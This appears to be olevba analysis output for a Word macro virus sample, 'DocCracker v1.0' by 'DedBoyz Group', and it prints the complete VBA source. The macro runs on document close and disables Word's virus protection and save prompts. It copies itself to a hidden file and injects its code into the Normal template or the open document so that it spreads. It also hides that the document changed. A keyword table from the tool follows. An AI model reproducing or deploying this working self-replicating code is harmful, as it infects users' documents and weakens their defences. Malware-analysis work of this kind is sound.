olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.ZeroBoyz-c5dc69459b5f786bd5e46e8024d906d7126b37b5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.ZeroBoyz-c5dc69459b5f786bd5e46e8024d906d7126b37b5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'(c) W.Destroyer
'(c) DedBoyz Group
'DocCracker v1.0
'-----------------
Private Sub Document_Close()

AtrCon = 6
Zerro = Chr(48)
Clean = ""
DotFile = "C:\Dbg.ext"
One = 1
On Error Resume Next
Options.VirusProtection = Zerro
Application.EnableCancelKey = Not -One
Options.SaveNormalPrompt = Zerro
ad_s = ActiveDocument.Saved
Options.ConfirmConversions = Zerro

If Dir(DotFile, AtrCon) = Clean Then
Open DotFile For Output As #1
For i = One To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
st = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, One)
Print #1, st
Next i
Close #1
SetAttr DotFile, AtrCon
End If
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "'(c) W.Destroyer" Then
Set t = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "'(c) W.Destroyer" Then
Set t = ActiveDocument.VBProject.VBComponents.Item(1)
Else
t = Clean
End If
If t <> Clean Then
Open DotFile For Input As #1
If LOF(1) = Zerro Then GoTo Qex
Counti = One
Do While Not EOF(1)
Line Input #1, LineCode
t.CodeModule.InsertLines Counti, LineCode
Counti = Counti + One
Loop
Qex:
Close #1
Asm = ""
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If

Randomize
If Rnd > 0.84 Then MsgBox "DocCracker v1.0 (c) DedBoyz Group", vbOKOnly, "<W.Destroyer>"
If ActiveDocument.Saved <> ad_s Then ActiveDocument.Saved = ad_s
End Sub 'It real good !!!

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

